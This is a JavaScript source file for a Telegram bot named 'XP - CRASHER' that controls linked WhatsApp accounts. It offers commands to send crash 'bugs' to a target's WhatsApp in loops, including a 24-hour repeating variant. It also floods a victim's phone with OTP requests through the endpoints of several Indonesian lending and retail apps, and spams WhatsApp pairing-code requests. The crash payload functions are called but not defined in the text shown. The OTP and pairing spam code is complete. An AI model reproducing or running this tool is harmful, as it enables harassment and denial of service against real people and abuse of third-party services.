const fs = require('fs');
const axios = require('axios');
const path = require('path');
const chalk = require('chalk');
const { Telegraf, Markup } = require('telegraf');
const {
    default: makeWASocket,
    makeInMemoryStore,
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket: WASocket,
    getGroupInviteInfo,
    AuthenticationState,
    BufferJSON,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessage,
    generateMessageID,
    generateWAMessageContent,
    encodeSignedDeviceIdentity,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    getContentType,
    mentionedJid,
    relayWAMessage,
    templateMessage,
    InteractiveMessage,
    Header,
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageContent,
    WAMessage,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMediaUpload,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    Presence,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    areJidsSameUser,
    ChatModification,
    getStream,
    isBaileys,
    jidDecode,
    processTime,
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    DisconnectReason,
    MediaConnInfo,
    ReconnectMode,
    AnyMessageContent,
    waChatKey,
    WAProto,
    BaileysError,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const moment = require('moment-timezone');
const { exec } = require('child_process');

const config = require('./ライブラリ/config');
const premiumUsers = require('./データベース/premium.json');

const bot = new Telegraf(config.tokens);

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./sessions";

let dim;

// ------------------ ( function spam pairing )
async function xpairinhspam(phoneNumber, codeCount, ctx) {
    const { state } = await useMultiFileAuthState('./xp/session');

    const GlobalTechInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    ctx.reply(`🚀 Start sending ${codeCount} pairings to ${phoneNumber}...`);

    for (let i = 0; i < codeCount; i++) {
        try {
            let code = await GlobalTechInc.requestPairingCode(phoneNumber);
            code = code?.match(/.{1,4}/g)?.join("-") || "Gagal ambil kode";

            await ctx.reply(`Pairing Code for ${phoneNumber} [${i + 1}/${codeCount}]:\n🔢 ${code}`);
        } catch (err) {
            console.error('Error:', err.message);
            await ctx.reply(`❌ Error on ${i + 1} attempt: ${err.message}`);
        }
    }

    ctx.reply('✅ Pairing process is complete!');
}

// ----------------- ( koneksi WhatsApp )
const saveActive = (botNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(botNumber)) {
    list.push(botNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (botNumber) => {
  const dir = path.join(sessions_dir, `device${botNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(`Found ${activeNumbers.length} active WhatsApp sessions`);

  for (const botNumber of activeNumbers) {
    console.log(`Connecting WhatsApp: ${botNumber}`);
    const sessionDir = sessionPath(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    dim = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      dim.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${botNumber} connected!`);
          sessions.set(botNumber, dim);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      dim.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (botNumber, chatId, ctx) => {
  const sessionDir = sessionPath(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`pairing with number *${botNumber}*...`, {
    parse_mode: "Markdown"
  });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, {
        parse_mode: "Markdown"
      });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  let paired = false;

  dim = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  dim.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "connecting") {
      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        setTimeout(async () => {
          try {
            const code = await dim.requestPairingCode(botNumber);
            const formatted = code.match(/.{1,4}/g)?.join("-") || code;
            await editStatus(makeCode(botNumber, formatted));
          } catch (err) {
            console.error("Error requesting code:", err);
            await editStatus(makeStatus(botNumber, `❗ ${err.message}`));
          }
        }, 3000);
      }
    }

    if (connection === "open" && !paired) {
      paired = true;
      sessions.set(botNumber, dim);
      saveActive(botNumber);
      await editStatus(makeStatus(botNumber, "✅ Connected successfully."));
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut && code >= 500) {
        console.log("Reconnect diperlukan untuk", botNumber);
        setTimeout(() => connectToWhatsApp(botNumber, chatId, ctx), 2000);
      } else {
        await editStatus(makeStatus(botNumber, "❌ Failed to connect."));
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }
  });

  dim.ev.on("creds.update", saveCreds);
  return dim;
};

const makeStatus = (number, status) => 
  `*Status Pairing*\nNomor: \`${number}\`\nStatus: ${status}`;

const makeCode = (number, code) =>
  `*Kode Pairing*\nNomor: \`${number}\`\nKode: \`${code}\``;

// ---------------- ( runtime )
const runTime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

bot.use(async (ctx, next) => {
  const userId = ctx.from?.id?.toString();

  if (!userId) {
    console.warn("User ID tidak ditemukan di ctx.from");
    return;
  }

  ctx.isOwner = userId === config.owner.toString();
  ctx.isPremium = premiumUsers.includes(userId);

  await next();
});

const thumb = "https://files.catbox.moe/zd0yq4.mp4";

bot.start(async (ctx) => {
  const time = runTime();
  const date = moment().tz('Asia/Jakarta').format('dddd, MMMM Do YYYY | HH:mm:ss');
  const menu = `
\`\`\`
✨ XP - CRASHER
\`\`\`
( 🌠 ) - Telegram || This bot was created by the developer. Please use it wisely and responsibly. Thank you.

🌼 Information  
★ Developer: DimzxzzxXD  
★ Version: 2.0  
★ Connect: ${sessions.size}  
★ Runtime: ${time}  
★ Date: ${date}

© DimzxzzxXD
`;

  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback("ʙᴜɢ ᴍᴇɴᴜ", "bug")],
    [Markup.button.callback("sᴇᴛᴛɪɴɢs", "settings")]
  ]);

  await ctx.replyWithVideo(
    { url: thumb },
    {
      caption: menu,
      parse_mode: "Markdown",
      reply_markup: buttons.reply_markup
    }
  );
});

bot.action("bug", async (ctx) => {
  const time = runTime();
  const date = moment().tz('Asia/Jakarta').format('dddd, MMMM Do YYYY | HH:mm:ss');
  const menu = `
\`\`\`
✨ XP - CRASHER
\`\`\`
( 🌠 ) - Telegram || This bot was created by the developer. Please use it wisely and responsibly. Thank you.

🌼 Information  
★ Developer: DimzxzzxXD  
★ Version: 2.0  
★ Connect: ${sessions.size}  
★ Runtime: ${time}  
★ Date: ${date}
━━━━━━━━━━━━━━━━━━━━━
- /xcrash <target>
 → Fore Close 

- /xbeta <target>
 → Fore Close beta

- /xhold <target>
  → hold fore close 

- /xinvis <target>
  → invis fore close 

- /xotp <62#####> <count>
  → spam otp [ only number +62 ]

- /xpairing <target> <count>
  → spam pairing 
`;

  await ctx.answerCbQuery();

  await ctx.editMessageMedia(
    {
      type: "video",
      media: thumb,
      caption: menu,
      parse_mode: 'Markdown'
    },
    {
      reply_markup: Markup.inlineKeyboard([
        [Markup.button.callback("🔙 Back", "back")]
      ]).reply_markup
    }
  );
});

bot.action("settings", async (ctx) => {
  const time = runTime();
  const date = moment().tz('Asia/Jakarta').format('dddd, MMMM Do YYYY | HH:mm:ss');
  const menu = `
\`\`\`
✨ XP - CRASHER
\`\`\`
( 🌠 ) - Telegram || This bot was created by the developer. Please use it wisely and responsibly. Thank you.

🌼 Information  
★ Developer: DimzxzzxXD  
★ Version: 2.0  
★ Connect: ${sessions.size}  
★ Runtime: ${time}  
★ Date: ${date}
━━━━━━━━━━━━━━━━━━━━━
- /addprem <id>
- /delprem <id>
- /addbot <number>
- /listsbot
- /delbot <number>
`;

  await ctx.answerCbQuery();

  await ctx.editMessageMedia(
    {
      type: "video",
      media: thumb,
      caption: menu,
      parse_mode: 'Markdown'
    },
    {
      reply_markup: Markup.inlineKeyboard([
        [Markup.button.callback("🔙 Back", "back")]
      ]).reply_markup
    }
  );
});

bot.action("back", async (ctx) => {
  const time = runTime();
  const date = moment().tz('Asia/Jakarta').format('dddd, MMMM Do YYYY | HH:mm:ss');
  const menu = `
\`\`\`
✨ XP - CRASHER
\`\`\`
( 🌠 ) - Telegram || This bot was created by the developer. Please use it wisely and responsibly. Thank you.

🌼 Information  
★ Developer: DimzxzzxXD  
★ Version: 2.0  
★ Connect: ${sessions.size}  
★ Runtime: ${time}  
★ Date: ${date}

© DimzxzzxXD
`;

  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback("ʙᴜɢ ᴍᴇɴᴜ", "bug")],
    [Markup.button.callback("sᴇᴛᴛɪɴɢs", "settings")]
  ]);

  await ctx.answerCbQuery();

  await ctx.editMessageMedia(
    {
      type: "video",
      media: thumb,
      caption: menu,
      parse_mode: "Markdown"
    },
    {
      reply_markup: buttons.reply_markup
    }
  );
});

bot.command('cekidch', async (ctx) => {
  const input = ctx.message.text.split(' ')[1];
  if (!input) return ctx.reply('❗Example: /cekidch xpxteams');

  const username = input.replace('@', '');
  const url = `https://api.telegram.org/bot${config.tokens}/getChat?chat_id=@${username}`;

  try {
    const response = await axios.get(url);
    const json = JSON.stringify(response.data, null, 2);
    ctx.reply(`📦 *Raw API Response:*\n\`\`\`json\n${json}\n\`\`\``, {
      parse_mode: 'Markdown'
    });
  } catch (err) {
    const errorJson = JSON.stringify(err.response?.data || { error: err.message }, null, 2);
    ctx.reply(`❌ *Error Response:*\n\`\`\`json\n${errorJson}\n\`\`\``, {
      parse_mode: 'Markdown'
    });
  }
});

bot.command("addbot", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: `/addbot <number>`", { parse_mode: "Markdown" });
  const botNumber = args[1];
  await ctx.reply(`⏳ Starting pairing to number ${botNumber}...`);
  await connectToWhatsApp(botNumber, ctx.chat.id, ctx);
});

bot.command("listbot", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  if (sessions.size === 0) return ctx.reply("no active sender.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Active Sender List:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delbot", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: /delbot 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender not found.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} was successfully deleted.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Failed to delete sender.");
  }
});

// --------------- ( function bug )
// to send bugs every heart
async function crashperma(target) {
  const pedo = async () => {
    console.log("start sending 60 bugs to", target);

    for (let i = 0; i < 60; i++) {
      try {
        await crashxpinvis(target);
        await crashxp(target);
        await xpcrash(target);
      } catch (err) {
        console.error(`Gagal mengirim ke ${target} pada bug ke-${i + 1}:`, err);
      }
    }

    console.log("finished sending bug, prepare bug to send again to", target);
  };

  await pedo();

  setInterval(pedo, 24 * 60 * 60 * 1000);
}





// ---------------- ( case spam otp )

bot.command('xotp', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const number = args[0];
    const count = parseInt(args[1]);

    if (!number || isNaN(count) || count <= 0) {
        return ctx.reply('Invalid format. Use: /xotp <target> <count>\nExample: /xotp 81234567890 3');
    }

    const fullNumber = number.startsWith('62') ? number : `62${number}`;
    ctx.reply(`📤 Spamming OTP to ${fullNumber} as many as ${count}x`);

    const apis = [
        async () => {
            await axios.post('https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code',
                new URLSearchParams({
                    phone: fullNumber,
                    sms_useage: 'LOGIN',
                    sms_service: 'WHATSAPP',
                    from: 'LOGIN'
                }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
            ctx.reply('[✓] PinjamDuit: Sent');
        },
        async () => {
            await axios.post('https://api.belanjaparts.com/v2/api/user/request-otp/wa', {
                phone: fullNumber,
                type: 'register'
            }, {
                headers: {
                    'content-type': 'application/json',
                    'authorization': 'Basic REPLACEME=='
                }
            });
            ctx.reply('[✓] BelanjaParts: Sent');
        },
        async () => {
            await axios.post('https://api102.singa.id/new/login/sendWaOtp', {
                mobile_phone: fullNumber,
                type: 'mobile',
                is_switchable: 1
            }, {
                headers: { 'Content-Type': 'application/json; charset=utf-8' }
            });
            ctx.reply('[✓] Singa: Sent');
        },
        async () => {
            await axios.get('https://api.uangme.com/api/v2/sms_code', {
                params: {
                    phone: fullNumber,
                    sms_useage: 'LOGIN',
                    sms_service: 'WHATSAPP',
                    from: 'LOGIN'
                },
                headers: {
                    'aid': '123',
                    'android_id': 'randomid',
                    'app_version': '1.0.0'
                }
            });
            ctx.reply('[✓] UangMe: Sent');
        },
        async () => {
            await axios.post('https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
                `appVersion=3.0.4&phone=${fullNumber}&userImei=1234567890`, {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                });
            ctx.reply('[✓] Cairin: Sent');
        },
        async () => {
            await axios.post('https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata', {
                mobileNumber: fullNumber,
                type: 'prospect-create',
                channel: 'whatsapp'
            }, {
                headers: { 'Content-Type': 'application/json; charset=utf-8' }
            });
            ctx.reply('[✓] Adiraku: Sent');
        },
        async () => {
            await axios.post('https://serpul-api.serpul.co.id/api/v2/auth/phone-number', {
                phone_number: fullNumber
            }, {
                headers: { 'Content-Type': 'application/json' }
            });
            ctx.reply('[✓] Serpul: Sent');
        },
        async () => {
            await axios.post('https://lottemartpoint.lottemart.co.id/api5/send_otp', {
                cellno: fullNumber,
                text: 'Kode OTP Anda adalah 123456'
            }, {
                headers: {
                    'authorization': 'Bearer REPLACEME',
                    'content-type': 'application/json'
                }
            });
            ctx.reply('[✓] LotteMart: Sent');
        }
    ];

    for (let i = 0; i < count; i++) {
        await Promise.allSettled(apis.map(api => api().catch(err => {
            ctx.reply('[x] Error: ' + (err.response?.data?.message || err.message));
        })));
    }

    ctx.reply('✅ OTP spam is over!');
});


// ----------------- ( case spam pairing )
bot.command('xpairing', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);

    const phoneNumber = args[0];
    const count = parseInt(args[1]);

    if (!phoneNumber || isNaN(count) || count <= 0) {
        return ctx.reply('❌ Incorrect format.\Use: /xpairing <target> <count>');
    }

    await xpairinhspam(phoneNumber, count, ctx);
});


// ----------------- ( case bug )
bot.command("xcrash", async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!ctx.isOwner && !ctx.isPremium) {
    return ctx.reply("❌ You don't have access.");
  }

  if (sessions.size === 0) {
    return ctx.reply("no active sender.");
  }

  if (!q) {
    return ctx.reply("Use: /xcrash 62×××");
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.reply(`
┏━━━━━━〣 Notification 〣━━━━━━━━┓
┃〢 Status : Send
┃〢 Tᴀʀɢᴇᴛ : ${target}
┃〢 Cᴏᴍᴍᴀɴᴅ : /xcrash
┃〢 Note : don't spam bug
┃〢 Connect : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);

  for (let i = 0; i < 40; i++) {
  await invisfc(target);
  }

});

bot.command("xbeta", async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!ctx.isOwner && !ctx.isPremium) {
    return ctx.reply("❌ You don't have access.");
  }

  if (sessions.size === 0) {
    return ctx.reply("no active sender.");
  }

  if (!q) {
    return ctx.reply("Use: /xbeta 62×××");
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.reply(`
┏━━━━━━〣 Notification 〣━━━━━━━━┓
┃〢 Status : Send
┃〢 Tᴀʀɢᴇᴛ : ${target}
┃〢 Cᴏᴍᴍᴀɴᴅ : /xbeta
┃〢 Note : don't spam bug
┃〢 Connect : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);

  for (let i = 0; i < 60; i++) {
  await crashperma(target);
  }

});

bot.command("xhold", async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!ctx.isOwner && !ctx.isPremium) {
    return ctx.reply("❌ You don't have access.");
  }

  if (sessions.size === 0) {
    return ctx.reply("no active sender.");
  }

  if (!q) {
    return ctx.reply("Use: /xhold 62×××");
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.reply(`
┏━━━━━━〣 Notification 〣━━━━━━━━┓
┃〢 Status : Send
┃〢 Tᴀʀɢᴇᴛ : ${target}
┃〢 Cᴏᴍᴍᴀɴᴅ : /xhold
┃〢 Note : don't spam bug
┃〢 Connect : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);

  for (let i = 0; i < 30; i++) {
  await crashperma(target);
  }

});

bot.command("xinvis", async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!ctx.isOwner && !ctx.isPremium) {
    return ctx.reply("❌ You don't have access.");
  }

  if (sessions.size === 0) {
    return ctx.reply("no active sender.");
  }

  if (!q) {
    return ctx.reply("Use: /xinvis 62×××");
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.reply(`
┏━━━━━━〣 Notification 〣━━━━━━━━┓
┃〢 Status : Send
┃〢 Tᴀʀɢᴇᴛ : ${target}
┃〢 Cᴏᴍᴍᴀɴᴅ : /xinvis
┃〢 Note : don't spam bug
┃〢 Connect : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);

  for (let i = 0; i < 30; i++) {
  await crashinvis(target);
  }

});

// -------------- ( Case Add premium dan Del premium )
bot.command("addprem", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: /addprem <id>");

  const userId = args[1];
  if (premiumUsers.includes(userId)) return ctx.reply("User is already registered as premium.");

  premiumUsers.push(userId);
  fs.writeFileSync('./データベース/premium.json', JSON.stringify(premiumUsers, null, 2));
  ctx.reply(`✅ User ${userId} successfully added as premium.`);
});

bot.command("delprem", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delprem 123456789");

  const userId = args[1];
  const index = premiumUsers.indexOf(userId);
  if (index === -1) return ctx.reply("User not found in premium list.");

  premiumUsers.splice(index, 1);
  fs.writeFileSync('./データベース/premium.json', JSON.stringify(premiumUsers, null, 2));
  ctx.reply(`✅ User ${userId} was successfully removed from the premium list.`);
});

(async () => {
  
  initializeWhatsAppConnections();
  bot.launch();
  console.log("bot Has Active");
})();
